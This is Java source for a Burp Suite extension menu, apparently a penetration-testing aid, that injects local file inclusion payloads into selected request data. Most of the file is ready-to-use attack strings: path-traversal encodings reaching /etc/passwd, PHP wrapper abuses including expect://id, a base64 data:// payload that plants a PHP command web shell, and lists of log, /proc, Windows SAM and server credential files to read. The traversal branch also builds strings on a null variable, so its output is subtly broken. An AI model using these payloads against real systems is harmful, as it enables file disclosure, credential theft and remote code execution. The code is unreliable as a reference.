/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package burp;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.Arrays;
import javax.swing.JMenu;

/**
 *
 * @author abdul.wahab
 */
public class LFI_Menu extends JMenu {
    public BurpExtender myburp;
    public String[] LFI_Menu = {"Simple Check", "Path Traversal", "Wrapper", "/proc", "Log Files", "Windows File"};
    public String LFIMenuItems[][] = {
        {"/etc/passwd", "/etc/passwd%00", "etc%2fpasswd", "etc%2fpasswd%00", "etc%5cpasswd", "etc%5cpasswd%00", "etc%c0%afpasswd", "etc%c0%afpasswd%00", "../../../etc/passwd", "../../../etc/passwd%00", "%252e%252e%252fetc%252fpasswd", "%252e%252e%252fetc%252fpasswd%00", "../../../../../../../../../etc/passwd..\\.\\.\\.\\.\\.\\.\\.\\.", "../../../../[бн]../../../../../etc/passwd", "....//....//etc/passwd", "..///////..////..//////etc/passwd", "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd","C:\\boot.ini", "C:\\WINDOWS\\win.ini"},
        {"../", "..%2f", "%2e%2e/", "%2e%2e%2f", "..%252f", "%252e%252e/", "%252e%252e%252f", "..\\", "..%255c", "..%5c..%5c", "%2e%2e\\", "%2e%2e%5c", "%252e%252e\\", "%252e%252e%255c", "..%c0%af", "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af", "..%25c0%25af", "..%c1%9c"},
        {"expect://id","expect://ls","php://input","php://filter/read=string.rot13/resource=index.php","php://filter/convert.base64-encode/resource=index.php","pHp://FilTer/convert.base64-encode/resource=index.php","php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd","data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4="},
        {"/proc/self/environ", "/proc/self/cmdline", "/proc/self/stat", "/proc/self/status", "/proc/self/fd/0", "/proc/self/fd/1", "/proc/self/fd/2", "/proc/self/fd/3"},
        {"/var/log/apache/access.log", "/var/log/apache/error.log", "/var/log/vsftpd.log", "/var/log/sshd.log", "/var/log/mail", "/var/log/httpd/error_log", "/usr/local/apache/log/error_log", "/usr/local/apache2/log/error_log", "/var/log/access_log", "/var/log/access.log", "/var/log/error_log", "/var/log/error.log", "/var/log/apache/access_log", "/var/log/apache2/access_log", "/var/log/apache2/error.log", "/var/log/httpd/access_log", "/opt/lampp/logs/access_log", "/opt/lampp/logs/access.log", "/opt/lampp/logs/error_log", "/opt/lampp/logs/error.log"},
        {"C:\\boot.ini", "C:\\WINDOWS\\win.ini", "C:\\WINDOWS\\php.ini", "C:\\WINDOWS\\System32\\Config\\SAM", "C:\\WINNT\\php.ini", "C:\\xampp\\phpMyAdmin\\config.inc", "C:\\xampp\\phpMyAdmin\\phpinfo.php", "C:\\xampp\\phpmyadmin\\config.inc.php", "C:\\xampp\\apache\\conf\\httpd.conf", "C:\\xampp\\MercuryMail\\mercury.ini", "C:\\xampp\\php\\php.ini", "C:\\xampp\\phpMyAdmin\\config.inc.php", "C:\\xampp\\tomcat\\conf\\tomcat-users.xml", "C:\\xampp\\tomcat\\conf\\web.xml", "C:\\xampp\\sendmail\\sendmail.ini", "C:\\xampp\\webalizer\\webalizer.conf", "C:\\xampp\\webdav\\webdav.txt", "C:\\xampp\\apache\\logs\\error.log", "C:\\xampp\\apache\\logs\\access.log", "C:\\xampp\\FileZillaFTP\\Logs", "C:\\xampp\\FileZillaFTP\\Logs\\error.log", "C:\\xampp\\FileZillaFTP\\Logs\\access.log", "C:\\xampp\\MercuryMail\\LOGS\\error.log", "C:\\xampp\\MercuryMail\\LOGS\\access.log", "C:\\xampp\\mysql\\data\\mysql.err", "C:\\xampp\\sendmail\\sendmail.log"}
        };
    
    LFI_Menu(BurpExtender burp){
        this.setText("LFI");
        this.myburp = burp;
        Methods.Create_Main_Menu(this, LFI_Menu, LFIMenuItems, new LFIItemListener(myburp));
    }
}





class LFIItemListener implements ActionListener {

    BurpExtender myburp;
    LFIItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        
        int[] selectedIndex = myburp.context.getSelectionBounds();
        
        String action = e.getActionCommand();
        
        byte[] newRequest = GetNewRequest(request, selectedIndex, action);
        req.setRequest(newRequest);
    }
    
    public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
        String selectedString =null;
		if (Arrays.asList("../", "..%2f", "%2e%2e/", "%2e%2e%2f", "..%252f", "%252e%252e/", "%252e%252e%252f", "..\\", "..%255c", "..%5c..%5c", "%2e%2e\\", "%2e%2e%5c", "%252e%252e\\", "%252e%252e%255c", "..%c0%af", "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af", "..%25c0%25af", "..%c1%9c").contains(action)){
            String str = Methods.prompt_and_validate_input("Enter No. of iteration", null);
            try{
                int num = Integer.parseInt(str);
                for(int i=1; i <= num; i++){
                    selectedString  += action; 
                }
                selectedString += "etc/passwd";
            }catch(NumberFormatException nfe){
                Methods.show_message("Enter proper interegr value!!!", "Input Not Valid");
            }
            
        }
        else{
            selectedString = action;
        }
        if (selectedString!=null){//caution the difference of equals and ==
        	return Methods.do_modify_request(request, selectedIndex, selectedString.getBytes());
        }else {
        	return request;
        }
    }
    
}